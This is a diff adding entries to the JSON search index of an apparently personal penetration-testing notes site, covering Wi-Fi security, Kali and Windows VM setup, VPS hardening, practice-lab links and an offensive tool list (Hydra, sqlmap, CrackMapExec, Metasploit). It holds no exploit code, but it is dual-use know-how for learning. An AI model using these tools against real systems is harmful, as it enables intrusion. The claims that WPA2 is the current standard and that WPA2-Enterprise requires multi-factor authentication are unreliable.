+    "doc": "Wireless Network Security",
+    "title": "Network Segmentation",
+    "content": "Network Segmentation is the basic practice of breaking larger networks into smaller, functionally similar networks with different access levels. This improves both security and performance. When segmenting a network, we should consider: . | The role of each segment | Which assets we are trying to protect | Who can access which network | . Home network example could include: . | Owner’s VLAN | Guest VLAN | Smart IoT Devices VLAN | . ",
+    "url": "/pen-test-docs/Knowledge/Networks/Wireless%20Network%20Security.html#network-segmentation",
+    "relUrl": "/Knowledge/Networks/Wireless%20Network%20Security.html#network-segmentation"
+  },"86": {
+    "doc": "Wireless Network Security",
+    "title": "Access Point Placement",
+    "content": "Its important to consider both the placement and strength of our access points. The access point should also be hidden from view so it cannot be physically configured. ",
+    "url": "/pen-test-docs/Knowledge/Networks/Wireless%20Network%20Security.html#access-point-placement",
+    "relUrl": "/Knowledge/Networks/Wireless%20Network%20Security.html#access-point-placement"
+  },"87": {
+    "doc": "Wireless Network Security",
+    "title": "Encryption",
+    "content": "All wireless activity should be securely encrypted. Currently, the accepted standard for security is WPA2. WPA2-Personal will require a single password to access Wi-Fi, while WPA2-Enterprise will require multi-factor authentication. It is recommended for home networks to setup a custom network with a name &amp; password rather than relying on the default one provided by the router. ",
+    "url": "/pen-test-docs/Knowledge/Networks/Wireless%20Network%20Security.html#encryption",
+    "relUrl": "/Knowledge/Networks/Wireless%20Network%20Security.html#encryption"
+  },"88": {
+    "doc": "Home",
+    "title": "Home Page",
+    "content": "This site is a collection of penetration testing and cyber security related materials, guides and resources. The site is split up into techniques and then individual skills &amp; technologies relating. General environment setup can be found here . ",
+    "url": "/pen-test-docs/#home-page",
+    "relUrl": "/#home-page"
+  },"89": {
+    "doc": "Home",
+    "title": "Unstructured Labs to Practice on",
+    "content": "| Category | Link | . | General | https://www.vulnhub.com/ | . | Web-hacking | https://www.vulnhub.com/entry/damn-vulnerable-web-application-dvwa-107,43/ | . | Web-hacking | https://github.com/digininja/DVWA | . | Web-hacking | http://www.itsecgames.com/ | . | Web-hacking | https://google-gruyere.appspot.com/part1 | . | General | https://www.offensive-security.com/labs/individual/ | . | General | https://www.hackthebox.eu/ | . | General | https://overthewire.org/wargames/ | . | General | https://tryhackme.com | . | Web-Hacking | https://portswigger.net/web-security/dashboard | . ",
+    "url": "/pen-test-docs/#unstructured-labs-to-practice-on",
+    "relUrl": "/#unstructured-labs-to-practice-on"
+  },"90": {
+    "doc": "Home",
+    "title": "Attacks",
+    "content": ". | Open-source Intelligence . | OSINT Framework | . | SQL Injection . | Basic SQL Syntax | Introduction | SQL Injection Cheatsheet | . | Web Application . | Cross-Site Request Forgery (CSRF) | Cross-Site Scripting (XSS) | Directory Enumeration Attack | Server Side Includes (SSI Framework) (.shtml) | . | . ",
+    "url": "/pen-test-docs/#attacks",
+    "relUrl": "/#attacks"
+  },"91": {
+    "doc": "Home",
+    "title": "Home",
+    "content": " ",
+    "url": "/pen-test-docs/",
+    "relUrl": "/"
+  },"92": {
+    "doc": "Practice Labs",
+    "title": "Practice Labs",
+    "content": " ",
+    "url": "/pen-test-docs/Practice-Labs/labs%20index.html",
+    "relUrl": "/Practice-Labs/labs%20index.html"
+  },"93": {
+    "doc": "Operating Systems",
+    "title": "Operating Systems",
+    "content": ". | Linux . | Penetration Testing Distributions | Setting Up Kali on VirtualBox | . | Windows . | Installing the Windows VM | . | . ",
+    "url": "/pen-test-docs/setting-up/operating-systems.html",
+    "relUrl": "/setting-up/operating-systems.html"
+  },"94": {
+    "doc": "Operating Systems",
+    "title": "Linux",
+    "content": "Most widely used OS for pen testing. Best to develop a certain standard for it that always leads to the same setup we are used to. Penetration Testing Distributions . Personal preference depending on needs and desires. Some of the most popluar lnclude: . | ParrotOS (Pwnbox) | Kali Linux (Personal Preference) | BlackArch | BackBox | . Setting Up Kali on VirtualBox . Official Documentation . Installing: . | Download the kali linux files | Import the ova file into virtual box | Follow the setup guide above to setup the system resources | Setup disk encryption with a secure password in pass manager | . System Setup . | Default login username: kali &amp; password kali | Change default password of root user running passwd in terminal | Change the default SSH keys | . $ cd /etc/ssh/ $ dpkg-reconfigure openssh-server . | Update the system with: | . $ sudo apt update -y &amp;&amp; sudo apt full-upgrade -y &amp;&amp; sudo apt autoremove -y &amp;&amp; sudo apt autoclean -y . Installing Additional Tools . It’s important to have an up-to-date tools list to add too personal tools list . | To install specific tools use: | . $ sudo apt install netcat ncat nmap ... -y . | To install from a list: | . $ sudo apt install $(cat tools.list | tr \"\\n\" \" \") -y . | Clone any useful repos from git from useful git repos | . Snapshotting . | After we setup our OS its important to snapshot it so we can return to this state if we ever need too. | It’s good practice to take snapshots of our system through a pen test in case something goes wrong (like taking a backup) | It is also useful when you are about to change major configuration options. | . Taking a snapshot . | Ensure the machine is turned off | Go into the snapshots section of VB | Take a new snapshot giving it a name and description | . ",
+    "url": "/pen-test-docs/setting-up/operating-systems.html#linux",
+    "relUrl": "/setting-up/operating-systems.html#linux"
+  },"95": {
+    "doc": "Operating Systems",
+    "title": "Windows",
+    "content": "Having a windows system can be a great penetration testing platform. Benefits: . | Blends into most enterprise environments | Easier to navigate and communicate with other hosts on an Active Directory domain if we use Windows versus Linux and some Python tooling | Traversing SMB (Server Message Block protocol, a network file sharing protocol) and utilizing shares is much easier | . Building our penetration testing platform can help us in multiple ways: . | Since we built it and only have tool necessary, we have a better understanding of everything happening. | We can ensure we do not having any unnecessary services running tha tcould potentially be a risk to ourselves and the customer. | Flexability of having multiple OS types. | Can also act as a testbed for payloads and exploits before launching them. | Building + testing ourselves means we know they will function as intended during an engagement. | . Windows Subsystem for Linux (WSL) allows for Linux OS’s to run alongside our windows install. This gives us space to run tools developed for Linux right inside our Windows host. Since the purpose of this platform is to perform penetration test functions, it will require some changes made to the host’s security settings. We need to ensure we isolate these tools off as Windows Defender will delete any detected files and applications, breaking our setup. Installing the Windows VM . Windows 10 VMs can be found build as ISO files here but you need to take a screenshot of the VM once it has been configured. Windows 10 can get pretty intensive so it’s recommended to give it 2 CPU cores &amp; 4Gb+ RAM &amp; 80Gb+ Storage . When installing a windows VM you need to make sure you disable network so you don’t need to login with a microsoft account. You can also install windows 10 at different patches and versions which means you can mimic your target system to test exploits out before deployment. We can have a different snapshot for each version and update our system step by step. Updates and patches can be downloaded from Microsoft Update Catalog . ",
+    "url": "/pen-test-docs/setting-up/operating-systems.html#windows",
+    "relUrl": "/setting-up/operating-systems.html#windows"
+  },"96": {
+    "doc": "OverTheWire",
+    "title": "OverTheWire",
+    "content": " ",
+    "url": "/pen-test-docs/Practice-Labs/overthewire/overthewire%20index.html",
+    "relUrl": "/Practice-Labs/overthewire/overthewire%20index.html"
+  },"97": {
+    "doc": "Personal Tools List",
+    "title": "Personal tools to install in my environment",
+    "content": ". | Personal Essential Tools: . | Networks | Web-applications | Analysis-and-exploitation | Other | . | . A comprehensive documentation for all the tools included in Kali-Linux can be found here . ",
+    "url": "/pen-test-docs/setting-up/personal-tools-list.html#personal-tools-to-install-in-my-environment",
+    "relUrl": "/setting-up/personal-tools-list.html#personal-tools-to-install-in-my-environment"
+  },"98": {
+    "doc": "Personal Tools List",
+    "title": "Personal Essential Tools:",
+    "content": "Networks . | Tool | Description | Type | . | Curl | Network utility tool for getting and sending data. | CLI | . | Ncat | An extension package to nmap (included as part of nmap). It provides a back-end tool to read and write data across a network using both TCP &amp; UDP. | CLI | . | Nmap | A network mapping tool, can be used for network discovery &amp; inventory and obtaining detailed network information. | CLI | . | Proxychains | Forces any TCP connections to go through a specified proxy. | CLI | . | Tcpdump | A command-line packet analyser and portable network traffic capture. | CLI | . | Testssl.sh | A tool that checks a server’s service on any port for the support of TLS/SSL ciphers, protocols as well as recent cryptographic flaws and more. | CLI | . | Theharvester | Wrapper for several search engines to find associated accounts &amp; information relating to a domain. | CLI | . | Wireshark | A network protocol analyser and packet sniffer. | Application | . Web-applications . | Tool | Description | Type | . | Ffuf | A fest web fuzzer written in Go that allows typical directory discovery, virtual host discovery (without DNS records) and GET and POST parameter fuzzing. | CLI | . | Gobuster | A tool to brute-force URIs including directories and files as well as DNS subdomains (simpler version than ffuf) | CLI | . | Hashcat | A password cracking tool with lots of optimisations and functionality for brute-force attacks and password cracking. | CLI | . | Hydra | A parallelized network login cracker capable of brute-force attacks on many common protocols | CLI | . | Sqlmap | Automates the process of detecting and exploiting SQL injection flaws and taking over database servers. | CLI | . | Zaproxy (owasp zap) | A web application security scanner, useful for identifying vulnerabilities in a web app. | Application | . Analysis-and-exploitation . | Tool | Description | Type | . | Openvas | The Open Vulnerability Assessment System is a suite of tools to test client computers for known exploits and weaknesses. | Application | . | Crackmapexec | This package is a swiss army knife for pentesting Windows/Active Directory environments. Enumerates logged on users, spiders SMB shares (shared resources/files), executing psexec style attacks (windows in-built remote command execution), auto-injecting Mimikatz/Shellcode/DLL’s into memory using Powershell, dumping the NTDS.dit and more. Also generates a database of credential information mapped to hosts. | CLI | . | Exiftool | A tool for reading, writing and editing meta data of files | CLI | . | Metasploit-framework | General penetration testing utility framework, an interface to work with vulnerable exploit code &amp; malware creation. | CLI | . | Radare2 | Framework designed for reverse-engineering and analysing binaries, contains a collection of utility modules. | CLI | . | Spiderfoot | Automated OSINT tool. | Application | . Other . | Tool | Description | Type | . | Git | A command-line tool for interacting with github. | CLI | . | Python2.7 | Python 2.7 for tools developed on this version. | CLI | . | Python3 | Python 3 for tools developed on this version. | CLI | . | Seclists | A comprehensive set of lists that can be used with many tools. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more. | Repo | . | Tilix | A tiling terminal emulator. | Application | . | Vim | A command-line text editor, often included as vi in UNIX systems. | CLI | . | Xfreerdp | A remote desktop protocol (RDP) client. | CLI | . ",
+    "url": "/pen-test-docs/setting-up/personal-tools-list.html#personal-essential-tools",
+    "relUrl": "/setting-up/personal-tools-list.html#personal-essential-tools"
+  },"99": {
+    "doc": "Personal Tools List",
+    "title": "Personal Tools List",
+    "content": " ",
+    "url": "/pen-test-docs/setting-up/personal-tools-list.html",
+    "relUrl": "/setting-up/personal-tools-list.html"
+  },"100": {
+    "doc": "Setting Up",
+    "title": "Setting Up",
+    "content": ". | My Personal Setup Steps | Documentation | . My Personal Setup Steps . | Install Screenshotting tools | Install VirtualBox for VMs | Install Docker &amp; Vagrant for container images | Download and setup a Kali Linux VM | . ",
+    "url": "/pen-test-docs/setting-up/setting-up.html",
+    "relUrl": "/setting-up/setting-up.html"
+  },"101": {
+    "doc": "Setting Up",
+    "title": "Documentation",
+    "content": ". | Logging . | Screenshotting . | Virtualization . | Hardware Virtualization | Virtual Box | . | Containers . | Docker | Vagrant | . | Operating Systems . | Linux | Windows | . | . ",
+    "url": "/pen-test-docs/setting-up/setting-up.html#documentation",
+    "relUrl": "/setting-up/setting-up.html#documentation"
+  },"102": {
+    "doc": "TryHackMe",
+    "title": "TryHackMe",
+    "content": " ",
+    "url": "/pen-test-docs/Practice-Labs/tryhackme/tryhackme%20index.html",
+    "relUrl": "/Practice-Labs/tryhackme/tryhackme%20index.html"
+  },"103": {
+    "doc": "Useful Github Repos",
+    "title": "Useful Github Repos",
+    "content": "PEASS - Privilege Escalation Awesome Scripts Suite . ",
+    "url": "/pen-test-docs/setting-up/useful-git-repos.html",
+    "relUrl": "/setting-up/useful-git-repos.html"
+  },"104": {
+    "doc": "Virtual Private Servers",
+    "title": "Virtual Private Servers",
+    "content": ". | VPS Setup | VPS Hardening | . A VPS is an isolated environment created on a physical server using virtualization technology. It can also be refered to as a Virtual Dedicated Server (VDS). They are an affordible model for offering a comprehensive range of functions at manageable prices. VPS Common use cases: . | Webserver | Development server | Pentesting | Proxy server | VPN | Mail server | Test server | Gaming server | DNS server | Code repo | . ",
+    "url": "/pen-test-docs/setting-up/virtual-private-servers.html",
+    "relUrl": "/setting-up/virtual-private-servers.html"
+  },"105": {
+    "doc": "Virtual Private Servers",
+    "title": "VPS Setup",
+    "content": ". | Install a new OS to the VPS (recommended Ubuntu, Debian etc) | SSH into the server | Make sure that it is updated with: | . $ sudo apt update -y &amp;&amp; sudo apt full-upgrade -y &amp;&amp; sudo apt autoremove -y &amp;&amp; sudo apt autoclean -y . | Install any tools you might need: | . $ sudo apt install net-tools $ sudo apt install xrdp . | Make any users you need to, ideally a sudo and one without admin perms | Setup any SSH keys needed (for windows you can use this guide to copy the key to the server) | . ",
+    "url": "/pen-test-docs/setting-up/virtual-private-servers.html#vps-setup",
+    "relUrl": "/setting-up/virtual-private-servers.html#vps-setup"
+  },"106": {
+    "doc": "Virtual Private Servers",
+    "title": "VPS Hardening",
+    "content": "The purpose of hardening is to lock down our VPS by limiting the access. We want to ensure that the only access is SSH and disable all other services. We will reduce the attack vectors to a minimum and provide only one possible access to the VPS, which we will secure as best as we can. We should also keep in mind not to store sensitive data on the VPS and always follow the principle that someone could gain access sooner or later. You should harden the VPS depending on its use and who needs access. There are many ways to harden it, these can include, but not limited to: . | Install Fail2ban | Working only with SSH keys | Reduce Idle timeout interval | Disable passwords | Disable X11 Forwarding | Use a different (non default) port | Limit users’ SSH access | Disable root logins | Use SSH proto 2 | Enable 2FA Authentication for SSH | . It is highly recommended to try these settings and precautions first in a local VM we have created before making these settings on a VPS . ",
+    "url": "/pen-test-docs/setting-up/virtual-private-servers.html#vps-hardening",
+    "relUrl": "/setting-up/virtual-private-servers.html#vps-hardening"
+  },"107": {
+    "doc": "VulnHub",
+    "title": "VulnHub",
+    "content": " ",
+    "url": "/pen-test-docs/Practice-Labs/vulnhub/vulnhub%20index.html",
+    "relUrl": "/Practice-Labs/vulnhub/vulnhub%20index.html"
+  }
+}
